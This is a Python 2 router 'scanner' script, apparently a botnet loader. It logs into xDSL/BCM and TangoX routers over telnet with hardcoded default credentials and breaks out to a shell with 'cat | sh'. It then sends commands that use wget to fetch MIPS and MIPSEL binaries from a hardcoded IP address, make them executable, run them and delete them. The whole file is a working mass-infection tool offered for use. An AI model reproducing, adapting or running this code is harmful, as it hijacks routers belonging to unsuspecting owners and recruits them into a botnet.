#!/usr/bin/python
# xDSL/Broadband(BCM/6511) Router Scanner | By; LiGhT
# ALL CIDR RANGES: http://pastebin.com/raw/q8AHkXcq

import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout

if len(sys.argv) < 3:
	print "Usage: python "+sys.argv[0]+" <list> <threads>"
	sys.exit()

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
queue = Queue()
combo = ["support:support", "admin:admin", "supervisor:zyad1234"] #dont change unless you know what u are doing
cmd_mips = "cd /tmp; wget http://81.28.6.115/ass.mips; chmod +x ass.mips; ./ass.mips XDL; rm -rf ass.mips"
cmd_mipsel = "cd /tmp; wget http://81.28.6.115/ass.mpsl; chmod +x ass.mpsl; ./ass.mpsl XDL; rm -rf ass.mpsl" 
queue_count = 0

for ip in ips:
	queue_count += 1
	stdout.write("\r[%d] Added to queue" % queue_count)
	stdout.flush()
	queue.put(ip)
print "\n"

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(2048)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				iP = queue.get()
				thrd = router(iP)
				thrd.start()
				queue.task_done()
				time.sleep(0.5)
			except:
				print "[*] THREAD UNABLE TO START"
				pass
	except:
		pass

class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		end = 0
		while (end == 0):
			try:
				try:
					tn = socket.socket()
					tn.settimeout(10)
					tn.connect((self.ip,23))
				except Exception:
					end = 1
					tn.close()
				username = ""
				password = ""
				for passwd in combo:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						hoho = ''
						hoho += readUntil(tn, ":")
						if "Login" in hoho:
							tn.send(username + "\n")
							time.sleep(0.09)
						elif "tangox" in hoho:
							tn.send("default" + "\n")
							time.sleep(0.09)
						else:
							tn.close()
							end = 1
					except Exception:
						end = 1
						tn.close()
					try:
						hoho = ''
						hoho += readUntil(tn, ":")
						if "assword" in hoho:
							tn.send(password + "\n")
							time.sleep(0.8)
						else:
							pass
					except Exception:
						end = 1
						tn.close()
					try:
						prompt = ''
						prompt += tn.recv(2048)
						if ">" in prompt:
							tn.send("cat | sh" + "\n")
							prompt = ''
							prompt += readUntil(tn, ">")
							if "unrecognized command cat" in prompt:
								print "\033[31m[!] Failed To Spawn Shell!\033[37m"
								tn.close()
								end = 1
							else:
								tn.send(cmd_mips + "\n")
								print "\033[32m[%s] xDSL Command Sent!\033[37m"%(self.ip)
								time.sleep(10)
								tn.close()
								end = 1
						elif "default@tangox" in prompt:
							tn.send(cmd_mipsel + "\n")
							print "\033[32m[%s] TangoX Command Sent!\033[37m"%(self.ip)
							time.sleep(10)
							tn.close()
							end = 1
						else:
							print "\033[31m[$] Failed!\033[37m"
							end = 0
					except Exception:
						end = 1
						tn.close()
			except:
				pass
	
for l in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
		time.sleep(0.03)
	except:
		print "[-] FAILED TO START WORKER THREAD"
		pass
